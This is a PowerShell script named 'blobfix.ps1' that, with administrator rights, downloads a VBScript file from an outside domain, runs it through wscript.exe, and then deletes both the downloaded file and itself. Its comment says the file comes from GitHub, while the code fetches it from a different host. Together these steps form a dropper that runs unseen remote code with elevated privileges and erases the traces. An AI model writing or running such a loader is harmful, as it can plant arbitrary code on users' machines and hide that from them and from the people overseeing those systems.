# blobfix.ps1
# Purpose: Download and execute blob.vbs from GitHub, then clean up with logging

# Initialize logging
$logFile = Join-Path $env:TEMP "blobfix_log.txt"
function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append
}

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "This script requires administrative privileges. Please run PowerShell as Administrator."
    Write-Log "Error: Script not running as Administrator."
    exit 1
}
Write-Log "Script started with administrative privileges."

# Define URLs and paths
$vbsUrl = "https://dl.cieverse.com/MarkX-V2.0/blob.vbs"
$tempDir = $env:TEMP
$vbsPath = Join-Path $tempDir "blob.vbs"
$scriptPath = $PSCommandPath

# Download the VBS file to temp directory
try {
    Write-Log "Downloading VBS from $vbsUrl to $vbsPath."
    Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -ErrorAction Stop
    Write-Log "VBS downloaded successfully."
}
catch {
    Write-Error "Failed to download VBS file: $_"
    Write-Log "Error downloading VBS: $_"
    exit 1
}

# Execute the VBS file using wscript.exe
try {
    Write-Log "Executing VBS file: $vbsPath."
    Start-Process -FilePath "wscript.exe" -ArgumentList $vbsPath -Wait -ErrorAction Stop
    Write-Log "VBS executed successfully."
}
catch {
    Write-Error "Failed to execute VBS file: $_"
    Write-Log "Error executing VBS: $_"
    exit 1
}

# Clean up: delete VBS and PS1 files with delay to ensure completion
try {
    Write-Log "Cleaning up files: $vbsPath, $scriptPath."
    Start-Sleep -Milliseconds 500 # Brief delay to ensure script completion
    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
    Write-Log "Cleanup completed."
}
catch {
    Write-Warning "Failed to delete temporary files: $_"
    Write-Log "Warning: Failed to delete files: $_"
}
